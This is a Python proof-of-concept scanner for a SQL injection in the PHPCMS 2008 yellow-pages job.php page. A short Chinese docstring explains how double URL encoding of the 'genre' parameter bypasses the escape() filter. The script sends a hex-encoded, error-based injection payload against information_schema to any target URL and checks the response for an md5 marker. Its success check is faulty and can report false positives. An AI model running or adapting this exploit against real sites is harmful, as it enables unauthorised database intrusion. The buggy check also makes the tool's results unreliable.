'''
common.inc.php文件代码第72行$action、genre变量由GET方式获得，
然后载入escape()方法进行过滤。执行代码第76行，用extract()方法将$_GET得到的数组拆分为变量。
执行job.php文件代码第80行，拼接完成SQL语句，带入数据库进行查询。
如果$genre变量进行二次URL编码即可绕过escape()方法的过滤，导致SQL注入漏洞产生。
'''
#!/usr/bin/env python
# coding=utf-8
import sys
import requests
def scan(target):
    info = {
    'name':u'PHPCMS 2008黄页模块SQL注入',
    'date':'2014-11-30',
    'author':'0x0F',
    'poc':'/yp/job.php?action=list&genre=a%2527%2B%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29%23'
    }
    headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    audit_request = requests.get(target + info['poc'],headers=headers)
    audit_request.close()
    if audit_request.status_code == 200:
        if audit_request.text.find('63e1f04640e83605c1d177544a5a0488') !=0 or audit_request.text.find('63e1f04640e83605c1d177544a5a0488') !=-1:
            print u'[!]audit success'
            print '[*]' + target + info['poc']
        else:
            print u'[!]audit error'
    else:
        print 'connection error'
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python phpcms_yp_job_php_sqli.py [target]\n"
        print "Example: python phpcms_yp_job_php_sqli.py  http://www.xxx.com\n"
        sys.exit(1)
    else:
        target = sys.argv[1].lower()
    scan(target)
